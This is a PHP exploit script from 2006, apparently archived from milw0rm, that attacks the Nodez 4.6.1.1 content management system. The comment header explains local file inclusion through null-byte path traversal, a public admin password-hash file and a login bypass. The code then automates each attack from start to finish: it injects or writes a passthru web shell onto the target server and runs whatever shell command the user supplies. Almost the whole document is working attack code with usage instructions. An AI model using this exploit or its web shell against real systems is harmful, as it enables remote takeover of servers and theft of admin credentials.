#!/usr/bin/php -q -d short_open_tag=on
<?
echo "Nodez 4.6.1.1 Mercury (possibly prior versions) multiple vulnerabilities\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n\r\n";

/*
   software:
   site: nodez.greentinted.com/
   description: Nodez - "An open source  (content management system), designed to
   be flexible, expandable, and as modular as possible." (ndr: maybe too modular ;) )

   short explaination:
   i) 'op','bop','ext','eop' arguments are not properly sanitized before to
   include files from local resources. You can include arbitrary files
   breaking the path through a null char (%00). Also you can inject
   php code in cache/ext/statman/log.gtdat file and launch commands
   including it, poc:

   http://[target]/[path]/index.php?node=system&op=extop&ext=statman&eop=/visitor&ip=[code]

   http://[target]/[path]/index.php?node=system&op=blockop&block=3&bop=../../../../cache/ext/statman/log.gtdat%00
   http://[target]/[path]/index.php?node=system&op=../../../cache/ext/statman/log.gtdat%00
   http://[target]/[path]/index.php?node=system&op=extop&ext=statman&eop=../../../../cache/ext/statman/log.gtdat%00
   http://[target]/[path]/index.php?node=system&op=extop&ext=../../cache/ext/statman/log.gtdat%00

   ii)
   to list all files on target system:
   http://[target]/[path_to_nodez]/countlines.php

   iii)last but not least, the most chritical issue:

   you can view all admin/users md5 password hashes, ex:

   http://[target]/[path_to_nodez]/cache/users/list.gtdat

   (if you do not believe it, give a look to the online demo:
   http://demo.opensourcecms.com/nodez/cache/users/list.gtdat)

   this because nodez do not provide an .htaccess file for users folder

   you don't need to force it to login as admin, you can
   craft a $_POST['upass'] value,ex:

   [admin_md5_hash][md5("rndval[numbers]")]

   this string should be calculated by a nodez javascript, but
   you can easily do by yourself (the second fragment is inside
   login page, something like "rndval[random_numbers]" )

   once you have an admin session cookie, you can create and edit php files
   (System options -> Toolbox -> Super Edit) and launch commands from them

   this exploit makes the dirty work for i) and iii)
                                                                              */
if ($argc<3) {
echo "Usage: php ".$argv[0]." host path action cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to nodez\r\n";
echo "action:    1 - through arbitrary local inclusion\r\n";
echo "               (works with magic_quotes_gpc= Off)\r\n";
echo "           2 - through admin authentication bypass\r\n";
echo "               (no php.ini restriction, you need the\r\n";
echo "               list.gtdat file)\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /nodez/ 2 ls -la\r\n";
echo "php ".$argv[0]." localhost /nodez/ 1 cat ./cache/users/list.gtdat\r\n";
echo "php ".$argv[0]." localhost /nodez/ 1 cat ./cache/users/list.gtdat -p81\r\n";
echo "php ".$argv[0]." localhost /nodez/ 1 cat ./cache/users/list.gtdat -P1.1.1.1:80\r\n";
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$action=$argv[3];
$cmd="";$port=80;$proxy="";

for ($i=4; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "action selected -> ".$action."\r\n";
if ($action=="1")
{

echo "[1] Injecting some code in log.gtdat file...\r\n";
$CODE ='<?php;ob_clean();echo(666);'; //notice the trick to work with short_open_tag off
$CODE.='passthru($_GET[cmd]);echo(666);die;?>';
$packet="GET ".$p."index.php?node=system&op=extop&ext=statman&eop=/visitor&ip=".$CODE." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: close\r\n\r\n";
#echo quick_dump($packet);
sendpacketii($packet);
sleep(1);
$xpl=array ( '&op=blockop&block=3&bop=../../../../cache/ext/statman/log.gtdat%00',
             '&op=../../../cache/ext/statman/log.gtdat%00',
             '&op=extop&ext=statman&eop=../../../../cache/ext/statman/log.gtdat%00',
             '&op=extop&ext=../../cache/ext/statman/log.gtdat%00'
            );

for ($i=0; $i<=count($xpl)-1;$i++)
{
$a=$i+2;
echo "[".$a."] Trying with ".$xpl[$i]."\r\n";
$packet="GET ".$p."index.php?cmd=".$cmd."&node=system".$xpl[$i]." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
#echo quick_dump($packet);
sendpacketii($packet);
if (strstr($html,"666"))
{
echo "Exploit succeeded...\r\n";
$temp=explode("666",$html);
echo $temp[1];
die;
}
}
}
else
if ($action=="2")
{
 echo "[1] Looking for list.gtdat file...\r\n";
 $packet="GET ".$p."cache/users/list.gtdat HTTP/1.0\r\n";
 $packet.="Host: ".$host."\r\n";
 $packet.="Connection: Close\r\n\r\n";
 #echo quick_dump($packet);
 sendpacketii($packet);
 if (strstr($html,"200 OK"))
 { echo "Done...we have list.gtdat file\r\n";
 }
 else
 {die("Exploit failed...");}
 $temp=explode(":\"",$html);
 $temp2=explode("\"",$temp[1]);
 $adm=$temp2[0];
 echo "admin -> ".$adm."\r\n";
 $temp2=explode("\"",$temp[3]);
 $hash=$temp2[0];
 echo "hash -> ".$hash."\r\n";

 echo "[2] Grab some data from login page...\r\n";
 $packet="GET ".$p."index.php HTTP/1.0\r\n";
 $packet.="Host: ".$host."\r\n";
 $packet.="Connection: Close\r\n\r\n";
 #echo quick_dump($packet);
 sendpacketii($packet);
 $temp=explode("+hex_md5('",$html);
 $temp2=explode("'",$temp[1]);
 echo "our string -> ".$temp2[0]."\r\n";
 $mypass=$hash.md5($temp2[0]);
 echo "our passport to heaven ->".$mypass."\r\n";
 $temp=explode("Set-Cookie: ",$html);
 $temp2=explode(" ",$temp[1]);
 $cookie=$temp2[0];
 echo "cookie -> ".$cookie."\r\n";

 echo "[3] Login...\r\n";
 $data ="uname=".urlencode($adm);
 $data.="&upass=".urlencode($mypass);
 $data.="&node=system";
 $data.="&ref=node%3Dsystem%26op%3Dlogout";
 $data.="&op=login";
 $packet ="POST ".$p."index.php? HTTP/1.0\r\n";
 $packet.="Host: $host\r\n";
 $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
 $packet.="Cookie: ".$cookie."\r\n";
 $packet.="Content-Length: ".strlen($data)."\r\n";
 $packet.="Connection: Close\r\n\r\n";
 $packet.=$data;
 #echo quick_dump($packet);
 sendpacketii($packet);
 if (eregi("Welcome back",$html)) {echo "Logged in...\r\n";}
                             else {die("Exploit failed...\r\n");}
 srand(make_seed());
 $anumber = rand(1,99999);

 echo "[4] Let's create a nodez id...\r\n";
 $packet ="GET ".$p."?node=system&op=advanced/superedit&step=edit&id=suntzu".$anumber." HTTP/1.0\r\n";
 $packet.="Host: ".$host."\r\n";
 $packet.="Cookie: ".$cookie."\r\n";
 $packet.="Connection: Close\r\n\r\n";
 #echo quick_dump($packet);
 sendpacketii($packet);

 echo "[5] Let's create the php file...\r\n";
 $data ="title=suntzu".$anumber;
 $data.="&type=blog";
 $data.="&path=../suntzu".$anumber.".php";
 $data.="&hits=0";
 $data.="&date=now";
 $packet= "POST ".$p."?node=system&op=advanced/superedit&step=save&id=../suntzu".$anumber.".php HTTP/1.0\r\n";
 $packet.="Host: ".$host."\r\n";
 $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
 $packet.="Content-Length: ".strlen($data)."\r\n";
 $packet.="Cookie: ".$cookie."\r\n";
 $packet.="Connection: Close\r\n\r\n";
 $packet.=$data;
 #echo quick_dump($packet);
 sendpacketii($packet);

 echo "[6] Let's save the evil code ...\r\n";
 $data ="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
 $data.="Content-Disposition: form-data; name=\"node\"\r\n\r\n";
 $data.="system\r\n";
 $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
 $data.="Content-Disposition: form-data; name=\"op\"\r\n\r\n";
 $data.="editfile\r\n";
 $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
 $data.="Content-Disposition: form-data; name=\"step\"\r\n\r\n";
 $data.="finish\r\n";
 $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
 $data.="Content-Disposition: form-data; name=\"parent\"\r\n\r\n";
 $data.="../suntzu".$anumber.".php\r\n";
 $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
 $data.="Content-Disposition: form-data; name=\"nodez_title\"\r\n\r\n";
 $data.="suntzu".$anumber."\r\n";
 $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
 $data.="Content-Disposition: form-data; name=\"nodez_longtitle\"\r\n\r\n";
 $data.="suntzu".$anumber."\r\n";
 $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
 $data.="Content-Disposition: form-data; name=\"nodez_body\"\r\n\r\n";
 $data.="<?php if(get_magic_quotes_gpc()){\$_GET[cmd]=stripslashes(\$_GET[cmd]);}echo 666;\r\n";
 $data.="passthru(\$_GET[cmd]);echo 666;?>\r\n";
 $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
 $data.="Content-Disposition: form-data; name=\"author\"\r\n\r\n";
 $data.="suntzu\r\n";
 $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
 $data.="Content-Disposition: form-data; name=\"areg\"\r\n\r\n";
 $data.="0\r\n";
 $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
 $data.="Content-Disposition: form-data; name=\"mood\"\r\n\r\n";
 $data.="\r\n";
 $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
 $data.="Content-Disposition: form-data; name=\"music\"\r\n\r\n";
 $data.="\r\n";
 $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
 $packet ="POST ".$p."index.php? HTTP/1.1\r\n";
 $packet.="Host: ".$host."\r\n";
 $packet.="Connection: Close\r\n";
 $packet.="Cookie:".$cookie."\r\n";
 $packet.="Content-Length: ".strlen($data)."\r\n";
 $packet.="Content-Type: multipart/form-data; boundary=----------lNnHj26YsSTIS0qSMhw5MK\r\n\r\n";
 $packet.=$data;
 #echo quick_dump($packet);
 sendpacketii($packet);

 echo "[7] Launch commands...\r\n\r\n";
 $packet ="GET ".$p."suntzu".$anumber.".php?cmd=".$cmd." HTTP/1.0\r\n";
 $packet.="Host: ".$host."\r\n";
 $packet.="Connection: Close\r\n\r\n";
 #echo quick_dump($packet);
 sendpacketii($packet);
 if (strstr($html,"666"))
 {
  echo "Exploit succeeded...\r\n\r\n";
  $temp=explode("666",$html);
  echo $temp[1];
  die;
 }
}
else
{die ("Wrong action...\r\n");}
//if you are here...
echo "Exploit failed...\r\n";
?>

# milw0rm.com [2006-03-18]
